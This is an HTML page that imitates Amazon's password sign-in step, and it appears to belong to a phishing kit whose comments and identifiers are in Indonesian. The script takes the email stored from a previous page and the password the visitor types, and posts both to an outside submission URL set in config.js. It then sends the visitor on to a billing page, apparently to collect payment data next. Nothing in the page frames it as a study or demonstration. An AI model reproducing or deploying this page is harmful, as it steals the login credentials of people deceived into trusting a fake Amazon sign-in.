<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <script src="config.js"></script>
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Amazon Ember', Arial, sans-serif; 
        }
        body { 
            background-color: #ffffff; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            padding: 20px; 
        }
        .logo { 
            margin: 15px 0 25px; 
        }
        .logo img { 
            height: 30px; 
            display: block;
            margin: 0 auto;
        }
        .kotak { 
            width: 100%; 
            max-width: 340px; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            padding: 20px 26px; 
        }
        h1 { 
            font-size: 28px; 
            margin-bottom: 12px; 
            font-weight: 400; 
        }
        .baris-email {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .baris-email a {
            color: #0066c0;
            text-decoration: none;
            margin-left: 5px;
        }
        .baris-email a:hover {
            text-decoration: underline;
        }
        .label-baris {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        label { 
            font-weight: 700; 
            font-size: 13px; 
        }
        .lupa-sandi {
            font-size: 13px;
            color: #0066c0;
            text-decoration: none;
        }
        .lupa-sandi:hover {
            text-decoration: underline;
        }
        input { 
            width: 100%; 
            padding: 7px 10px; 
            border: 1px solid #a6a6a6; 
            border-radius: 4px; 
            margin-bottom: 20px; 
            font-size: 15px; 
            height: 31px;
        }
        input:focus { 
            outline: none; 
            border-color: #0071e3; 
            box-shadow: 0 0 3px rgba(0,113,227,0.5); 
        }
        button { 
            width: 100%; 
            padding: 7px 10px; 
            background: linear-gradient(to bottom, #f7dfa5, #f0c14b); 
            border: 1px solid #a4862c; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 15px; 
            height: 31px;
        }
        button:hover { 
            background: linear-gradient(to bottom, #f5d78e, #e6b337); 
        }
        button:disabled { 
            background: #eee; 
            border-color: #ccc; 
            cursor: not-allowed; 
            opacity: 0.7; 
        }
        .footer {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
            padding-top: 15px;
            border-top: 1px solid #eee;
        }
        .footer a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .hak-cipta {
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="img/logo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in</h1>
        
        <p class="baris-email" id="barisEmail">
            <span id="emailTampil"></span>
            <a href="index.html">Change</a>
        </p>
        
        <form id="formSandi">
            <div class="label-baris">
                <label for="password">Password</label>
                <a href="#" class="lupa-sandi">Forgot password?</a>
            </div>
            <input type="password" id="password" name="password" required>
            
            <button type="submit" id="tombolMasuk" disabled>Sign in</button>
        </form>
    </div>

    <div class="footer">
        <div>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

    <script>
        // Ambil email dari halaman index.html
        const emailPengguna = localStorage.getItem('emailPengguna') || '';
        document.getElementById('emailTampil').textContent = emailPengguna;

        const inputSandi = document.getElementById('password');
        const tombolMasuk = document.getElementById('tombolMasuk');
        const formSandi = document.getElementById('formSandi');

        // Aktifkan tombol jika sandi terisi
        inputSandi.addEventListener('input', () => {
            tombolMasuk.disabled = inputSandi.value.trim().length < 1;
        });

        // Kirim data ke email lalu lanjut ke billing.html
        formSandi.addEventListener('submit', async (e) => {
            e.preventDefault();
            tombolMasuk.disabled = true;
            tombolMasuk.textContent = 'Signing in...';

            const data = {
                email: emailPengguna,
                password: inputSandi.value.trim(),
                tipe: 'Login - Email & Password'
            };

            try {
                await fetch(CONFIG.formSubmitUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (err) {
                console.log('Tetap dialihkan');
            }

            // Langsung lanjut ke halaman billing
            window.location.href = 'billing.html';
        });
    </script>
</body>
</html>
